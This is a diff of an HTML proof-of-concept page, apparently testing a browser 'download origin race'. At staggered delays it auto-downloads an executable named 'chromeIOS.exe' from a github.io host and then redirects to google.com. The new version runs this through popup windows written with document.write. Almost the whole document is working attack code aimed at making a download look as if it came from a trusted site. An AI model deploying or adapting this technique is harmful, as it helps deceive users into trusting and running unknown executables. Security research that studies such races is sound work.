@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Download Race Condition Test</title>
+<title>Download Race Test</title>
 
 <style>
 button{
@@ -13,21 +13,14 @@ padding:15px 30px;
 font-size:16px;
 cursor:pointer;
 }
-
-#log{
-font-family:monospace;
-margin-top:20px;
-}
 </style>
 
 </head>
 <body>
 
 <center>
-<h2>Chrome Download Origin Race Test</h2>
+<h2>Window.open Download Race Test</h2>
 <button onclick="start()">Start Test</button>
-
-<div id="log"></div>
 </center>
 
 <script>
@@ -36,45 +29,34 @@ const file="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
 
 function start(){
 
-log("Starting race test...");
-
-let delays=[10,30,60,120,200,300];
+let delays=[10,50,120,200,320];
 
 delays.forEach((delay,i)=>{
 
 setTimeout(()=>{
 
-log("Attempt delay: "+delay+"ms");
+let w=window.open("about:blank");
 
-triggerDownload();
+w.document.write(`
+<script>
 
-setTimeout(()=>{
-window.location.replace("https://google.com");
-},delay);
-
-},i*1200);
-
-});
-
-}
-
-function triggerDownload(){
-
-let a=document.createElement("a");
-a.href=file;
-a.download="chromeIOS.exe";
-
+var a=document.createElement('a');
+a.href='${file}';
+a.download='chromeIOS.exe';
 document.body.appendChild(a);
 a.click();
 document.body.removeChild(a);
 
-}
+setTimeout(function(){
+location.href='https://google.com';
+},${delay});
 
-function log(msg){
+<\/script>
+`);
 
-let d=document.createElement("div");
-d.textContent=msg;
-document.getElementById("log").appendChild(d);
+},i*1500);
+
+});
 
 }
 
